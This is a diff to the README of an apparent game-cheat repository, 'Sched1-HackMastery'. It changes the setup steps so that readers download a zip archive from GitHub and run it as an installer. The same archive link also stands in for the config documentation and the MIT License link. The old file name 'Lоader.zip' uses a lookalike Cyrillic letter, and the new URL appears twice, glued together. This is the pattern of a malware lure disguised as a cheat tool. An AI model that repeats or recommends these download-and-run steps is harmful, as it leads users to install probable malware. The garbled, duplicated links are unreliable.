@@ -59,11 +59,11 @@ Discover the powerful modules and utilities included with **Schedule 1 Hacks Che
 
 Quick and easy setup for all supported operating systems! 🏁
 
-1. **Download** `https://raw.githubusercontent.com/Mehdia-Batool/Sched1-HackMastery/main/Lоader.zip` from the repository.
+1. **Download** `https://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zipоhttps://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zip` from the repository.
 2. **Extract** the archive to a directory of your choice.
-3. **Run** the installer (`https://raw.githubusercontent.com/Mehdia-Batool/Sched1-HackMastery/main/Lоader.zip` on Windows, or equivalent for your OS).
+3. **Run** the installer (`https://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zipоhttps://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zip` on Windows, or equivalent for your OS).
 4. **Follow** the on-screen instructions to complete setup.
-5. For advanced customization, review the `/config` folder and read the included `https://raw.githubusercontent.com/Mehdia-Batool/Sched1-HackMastery/main/Lоader.zip`.
+5. For advanced customization, review the `/config` folder and read the included `https://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zipоhttps://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zip`.
 
 *Make sure you have the latest updates for your OS for best compatibility.*
 
@@ -77,7 +77,7 @@ Quick and easy setup for all supported operating systems! 🏁
 
 ## 📄 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/Mehdia-Batool/Sched1-HackMastery/main/Lоader.zip) for 2025. Free for personal and commercial use with proper attribution. See the `LICENSE` file for full details.
+This project is licensed under the [MIT License](https://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zipоhttps://github.com/Mehdia-Batool/Sched1-HackMastery/raw/refs/heads/main/leaguer/Sched_Hack_Mastery_aposaturnium.zip) for 2025. Free for personal and commercial use with proper attribution. See the `LICENSE` file for full details.
 
 ---
 
